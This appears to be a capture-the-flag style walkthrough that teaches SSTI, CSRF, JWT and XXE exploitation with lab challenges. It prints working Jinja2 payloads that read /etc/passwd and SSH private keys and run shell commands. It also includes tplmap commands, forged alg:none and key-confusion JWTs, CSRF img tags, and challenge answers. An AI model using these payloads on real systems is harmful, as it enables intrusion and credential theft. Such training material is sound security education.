Learn and practice exploiting a range of unique web vulnerabilities such as SSTI, CSRF, JWT and XXE.


### TASK 1: Introduction

There are quite a lot of vulnerabilities that affect web applications. This leads to the problem of having quite a bit of material to cover, so it's fair to only cover the bigger/more common vulnerabilities in lieu of the smaller/less common vulnerabilities. This room is dedicated to some of the smaller web vulnerabilities, that may not be large enough to get a room on this site but are still worth knowing about. 

The vulnerabilities that will be discussed are:  

SSTI  
CSRF  
JWT  
XXE

### TASK 2 : Methodology

This room will be divided into sections, each section talking about a specific vulnerability. The sections will follow this format: an introduction on what the vulnerable thing is, what the vulnerability(s) is/are (there may be multiple tasks on this), a guided exploitation in which I show pictures of how it's exploited, and finally a virtual machine where you will be asked to exploit it and collect a flag. 

Since this room is divided into sections that don't follow one another, you can do this room in any order you please.

### TASK 3 - Section 1 - SSTI(What is SSTI)

A template engine allows developers to use static HTML pages with dynamic elements. Take for instance a static profile.html page, a template engine would allow a developer to set a username parameter, that would always be set  to the current user's username  

Server Side Template Injection, is when a user is able to pass in a parameter that can control the template engine that is running on the server.

For example take the code    

![](https://imgur.com/GAO1km1.png)

This introduces a vulnerability, as it allows a hacker to inject template code into the website. The effects of this can be devastating, from XSS, all the way to RCE.

Note: Different template engines have different injection payloads, however usually you can test for SSTI using {{2+2}} as a test.

### TASK 4: Section 1 - SSTI(Manual exploitation of SSTI)

Turning the code earlier into a full flask application, gives us this page. It takes a prompt for a name, and then returns `Hello <name>!`.

![](https://imgur.com/j0FJBw5.png)  

Fortunately, we don't have to do much recon as we already know this is vulnerable to SSTI, lets try injecting some basic template code

![](https://imgur.com/CdzYeHS.png)  

Boom! That's template injection. We can use the wonderful repository [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection), to find some payloads for flask's template engine. The repo says we can use the code 

`{{ ''.__class__.__mro__[2].__subclasses__()[40]()(<file>).read()}}` to read files on the server. Effectively all that payload does is load the file object in python, from there we can use basic file operations. Let's try to read /etc/passwd using this method 

![](https://imgur.com/a7RphqV.png)  

We have LFI! Unfortunately(or fortunately depending on how you view it), that is not the extent of this vulnerability. The same repo, also includes a payload for remote code execution. 

We can use the code `{{config.__class__.__init__.__globals__['os'].popen(<command>).read()}}` to execute commands on the server. All that payload does is import the os module, and run a command using the popen method.

![](https://imgur.com/XTDPJSX.png)  

From there, an attacker has already won, they can use this ability to gain a shell on the server.


1. How would a hacker(you :) ) cat out /etc/passwd on the server(using cat with the rce payload)

*ANSWER:* ``{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}`

2. What about reading in the contents of the user test's private ssh key.(use the read file one not the rce one)

*ANSWER:* `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/home/test/.ssh/id_rsa').read() }}`

### TASK 5: Section 1 - SSTI: Automatic Exploitation of SSTI


Fortunately, we don't have to go searching for payloads to see how we can use SSTI to our advantage, because there is a tool known as Tplmap that does that for us! The tool can be found [here](https://github.com/epinna/tplmap). 

Note: use python2 to install the requirements. python2 -m pip

The basic syntax for tplmap is different depending on whether you're using get or post

GET

`tplmap -u <url>/?<vulnparam>`

POST

`tplmap -u <url> -d '<vulnparam>'`

Since our code operates via a form, the post syntax will be used.

![](https://imgur.com/416wOwX.png)

From there we can effectively do everything we did in the manual exploitation task, from a command line. Let's try running id using tplmap.

![](https://imgur.com/eqUQETT.png)

Victory!

	
1. How would I cat out /etc/passwd using tplmap on the ip:port combo 10.10.10.10:5000, with the vulnerable param "noot".
	
*ANSWER:* `tplmap -u http://10.10.10.10:5000/ -d 'noot' --os-cmd 'cat /etc/passwd'`

### TASK 6: Section 1 - SSTI :Challenge
	

I've created a vulnerable machine for you to test your SSTI skills on! I've placed a flag in /flag aswell, good luck and have fun!
	

1. What is the flag?
	
*payload:* ``{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}``
*ANSWER:* `cooctus`

### TASK 7 : Section 2 - CSRF: What is CSRF

Cross Site Request Forgery, known as CSRF occurs when a user visits a page on a site, that performs an action on a different site. For instance, let's say a user clicks a link to a website created by a hacker, on the website would be an html tag such as <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">  which would change the account email on the vulnerable website to "pwned@evil-user.net".  CSRF works because it's the victim making the request not the site, so all the site sees is a normal user making a normal request.  

This opens the door, to the user's account being fully compromised through the use of a password reset for example. The severity of this cannot be overstated, as it allows an attacker to potentially gain personal information about a user, such as credit card details in an extreme case.


### TASK 8 : Section 2 - CSRF : Manual exploitation of CSRF

Let's take an example application   

![](https://imgur.com/P6oMiiZ.png)

It seems simple enough, As user bob, I can send funds to either Bob or Alice with any of the available balance in my account. Let's take a closer look at the request in burp.

![](https://imgur.com/RYEnGqy.png)

This is looking good, parameters we can customize and a session cookie that is automatically set. Everything seems vulnerable to CSRF. Let's try and make a vulnerable site. Putting <img src="http://localhost:3000/transfer?to=alice&amount=100"> into an html file and using SimpleHTTPServer to host it should change's Alice's balance by 100, Let's see if it does!

![](https://imgur.com/wUUlax4.png)

Woohoo, CSRF exploited!


### TASK 9 : Section 2 - CSRF : Automatic Exploitation

Once again, there is a nice automated scanner, which tests if a site is vulnerable to CSRF. this tool is known as xsrfprobe and can be install via pip using `pip3 install xsrfprobe`. This will only work using python 3(I mean come on it's 2020 you should be using python 3 anyway).

The syntax for the command is `xsrfprobe -u <url>/<endpoint>`. Let's run this against our vulnerable site.

![](https://imgur.com/5gx7k8D.png)

The output confirms that we've managed to manually exploiting it and that the site is vulnerable to csrf.

1. What parameter allows us to generate a POC(actual exploit)

*ANSWER:* `--malicious`

### TASK 10 : Section 2 - CSRF : Challenge?

Due to the nature of CSRF, I can't really give you a challenge to complete with a flag. So I'll give you one without a flag! Your challenge is to make a website vulnerable to CSRF, and exploit it.


### TASK 11 : Section 3 - JWT : Intro

Json Web Token's are a fairly interesting case, as it isn't a vulnerability itself. Infact, it's a fairly popular, and if done right very secure method of authentication. The basic structure of a JWT is this, it goes "header.payload.secret", the secret is only known to the server, and is used to make sure that data wasn't changed along the way. Everything is then base64 encoded. so an example JWT token would look like `"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"`  

Meaning that if we are able to control the secret, we can effectively control the data. To be able to do this we have to understand how the secret is calculated. This requires knowing the structure of the header, a typical JWT header looks like this {"typ":"JWT","alg":"RS256"}. We're interested in the alg field. RS256 uses a private RSA key that's only available to the server, so that's not vulnerable. However, We can change that field to HS256, This is calculated using the server's _public_ key, which in certain circumstances we may have access too.


### TASK 12 : Section 3 - JWT : Manual JWT Exploitation

We start off with a basic application

![](https://imgur.com/ygQg3D8.png)  

With a JWT, and a JWT verifier. Sending it garbage results in a failure, so let's try decoding the JWT.

![](https://imgur.com/RItwOM3.png)  

Decoding the JWT gives us our header, payload, and a bunch of garbage which is the secret.

![](https://imgur.com/wgGLkHA.png)

Unfortunately it seems the algorithm is RS256, which doesn't have any vulnerabilities. Fortunately for us though, this server leaves its public key lying around, which means we can change the algorithm and sign a new secret! The first step is to change the algorithm in the header to HS256, and then re encode it in base64. Our new JWT is `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0IiwiaWF0IjoxNTg1MzIzNzg0LCJleHAiOjE1ODUzMjM5MDQsImRhdGEiOnsiaGVsbG8iOiJ3b3JsZCJ9fQ.FXj9F1jIXlhMyoQAo5-XPOiZeP4Ltw5XXZGqgX49tKkYUOeirOXUDgWL4bqP9nRXIODqOByqS_9O11nQN5bC_LTpfBWG2WZXg0tKIDAbKTxVkrytXBmOkP1qRK_Apv-CQs-mouuS1we8SHYShW_r4DEj0qAF3dsWVVzbRWNMH4Oc_odHNogv00dVlABcxMyXFpNJbeRS6-GCS-A4SFM32gMv_mkfkXrQPdejKDU_sKZrD5VVAmDlu0BainIvD28l8uV3OCc37shtPW0TKoIwUXmGsFYouKqk-h0dz4aTBLKJk7L64XdrA7ts1oOtzk8KqV6gnqXDXUNkzDX3qd9JKA`

The next step is to convert the public key to hex so openssl will use it.

![](https://imgur.com/ZoOsCaO.png)

  
(Explanation: a is the file with the public key, `xxd -p` turns the contents of a file to hex, and `tr` is there to get rid of any newlines)

The next step is to use openssl to sign that as a valid HS256 key.

![](https://imgur.com/tYWFci2.png)  

Everything is going just fine so far!. The final step is to decode that hex to binary data, and reencode it in base64, luckily python makes this really easy for us.

![](https://imgur.com/XfR9H8t.png)  

That's our final secret, now we just put that where the secret should go, and the server should accept it.

So our final JWT would be`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.<payload>.<new secret>`

  

![](https://imgur.com/mdsgxHx.png)


### TASK 13 : Section 3 - JWT : Automatic JWT Exploitation

Due to the fact that JWT tokens often expire, there's no real way to guarantee that finding the public key is possible, and that there is no way to keep the data portion of the JWT consistent, there aren't tools avaliable that automatically exploit JWT vulnerabilities. JWT vulns have to be exploited on a case by case basis.

Now that doesn't mean you can't write a script that does everything automatically for a specific website that you know is vulnerable, it's just that by the time you succeed in doing that, you could have already exploited the vulnerability.


### TASK 14 : Section 3 - JWT : Challenge!

The challenge is effectively the exact same application shown in the Manual exploitation section. If you succeed in exploiting it, you will get the flag!

The public key can be found at /public.pem.

Generated JWT tokens will also expire after a certain amount of time, so if you don't get it the first try, try doing it faster!  

Note: some recommended reading [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)


1. What is the flag?


### TASK 15 :  Section 3.5 - JWT : Intro

In addition to the previous vulnerability, certain JWT libraries have another devastating vulnerability. There is actually three possible algorithms, two of them RS256 and HS256 which we have already studied. There is a third algorithm, known as `None`. According to the official [JWT RFC](https://tools.ietf.org/html/rfc7519) the None algorithm is used when you still want to use JWT, however there is other security in place to stop people from spoofing data. 

Unfortunately certain JWT libraries clearly didn't read the RFC, allowing a vulnerability where an attacker can switch to the None algorithm, in the same way one switches to RS256 to HS255, and have the token be completely valid without even needing to calculate a secret.


### TASK 16: Section 3.5 - JWT : Manually exploitating the JWT None vuln

We start off with a simple login application.

![](https://imgur.com/nfztNWp.png)

Logging in gives us a user screen, as well as a JWT token.  

![](https://imgur.com/yAqR7yp.png)

Let's examine that token in the wonderful site [jwt.io](https://jwt.io/)

![](https://imgur.com/7uY7xa1.png)  

(Very nice site btw, definitely recommend for all your jwt needs)

Now let's try changing the alg field to none, get rid of the signature, and change the role to admin. That leaves us with this final jwt token. `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNTg1MzQ1ODg0MjA0LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTg1MzQ1ODg0fQ.`

The interesting thing is, we still need a second . to denote that a signature would be there, even though we don't put anything after it. Let's try popping that token in where the cookie is supposed to be.

![](https://imgur.com/gj7YxlK.png)

Boom! JWT exploited.


### TASK 17 : Section 3.5 - JWT : Automatic Exploitation

There is no tool that can check the library, get the token, and make sure this is vulnerable. Therefore, you're gonna have to do this manually. The header for each JWT none vuln though is the same, which can help you out. Here's the header  

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
```

Which decodes to {"type": "JWT", "alg": "none"}

### TASK 18 : Section 3.5 - JWT : Challenge

You know the drill, you're given a vulnerable application and there's a flag once you become admin. Good luck!

1. What is the flag?


### TASK 19 : Section 4 - XXE : Intro


Certain applications will occasionally have you post an XML document to do an action. Improper handling of these XML documents can lead to what's known as XML External Entity Injection(XXE). XXE is when an attacker is able to use the ENTITY feature of XML to load resources from outside the website directory, for example XXE would allow an attack to load the contents of /etc/passwd.

Since the application doesn't necessarily have to return data, you may not be able to get the contents of the external entity; however, that doesn't mean all hope is lost. If you're really lucky you may be able to use the php expect module to get RCE anyway.


### TASK 20 : Section 4 - XXE : Manual exploitation of XXE

Once again we start off with a simple login application

![](https://imgur.com/50Mp5gB.png)  
Let's fill it with random data and examine the request in burp.![](https://imgur.com/E3i4wbV.png)

It seems all of our data is being put into XML format, and is being posted to "process.php". Let's send the request and see what we get.

![](https://imgur.com/IBri053.png)

This is very promising, because it returns the output of one of the XML fields, meaning we may be able to view the contents of files on the filesystem. Further playing with the requests, tells me that it returns the email field.

![](https://imgur.com/Jy6ZDSa.png)

Let's try creating an entity that has the value of /etc/passwd. We can do this by once again using the amazing repository [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe).

![](https://imgur.com/hATuDB6.png)  

We have XXE! Typically this is the best case scenario, we can get the output of files on the system, and from that we could enumerate further. There is however, a chance that we could get RCE from XXE if the php expect module is loaded. Let's try doing that.All expect is a php module that allows you to run commands.  

![](https://imgur.com/tlbDd7j.png)  

Fortunately for us, we can use "expect://". Even with XXE this module especially is not guaranteed, ,meaning that a user has to manually install it, so don't immediately go for the RCE.


### TASK 21 : XXE : Automatic exploitation

XXE can't really be automatically exploited, as you can't guarantee xml data will be the same, and which payload will or won't work. By the time you figure out that it's vulnerable and make a script to exploit it, you could have a reverse shell or LFI already using burp.


### TASK 22 : Section 4 - XXE : Challenge

This challenge will ask you some basic questions on the system, and the application is vulnerable to XXE. Good luck!

1. How many users are on the system?

2. What is the name of the user with a UID of 1000?


### TASK 23 : Bonus Section : JWT once again

Recall that JWT HS256 is calculated using a secret.The exact format of the calculation is

```
HMACSHA256( base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
```

Therefore, it stands to reason that, since we have the full jwt token, and the header and payload, the secret can be brute forced to obtain the full JWT token. If the secret can be brute forced then the attacker could sign his own JWT tokens.



### TASK 24 : Bonus Section : Bruteforcing JWT tokens

To brute force these secrets we'll be using a tool called [jwt-cracker](https://github.com/lmammino/jwt-cracker). The syntax of jwt-cracker is`jwt-cracker <token> [alphabet] [max-length]` where alphabet and max-length are optional parameters.

Explanation of Paramaters:

Token  

The HS256 JWT token  

Alphabet  

The alphabet that the cracker will use to check passwords(default: "abcdefghijklmnopqrstuvwxyz")  

max-length  

The max expected length of the secret(12 by default)  

Using an example token from jwt.io lets see how long it takes to crack.

![](https://imgur.com/Ov20ZaE.png)  

 In 4 seconds, we've tried 300000 passwords and cracked the secret!
 
 
 ### TASK 25 : Bonus Section : Challenge
 
 Given the following token  
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.it4Lj1WEPkrhRo9a2-XHMGtYburgHbdS5s7Iuc1YKOE`

1. What is the secret?


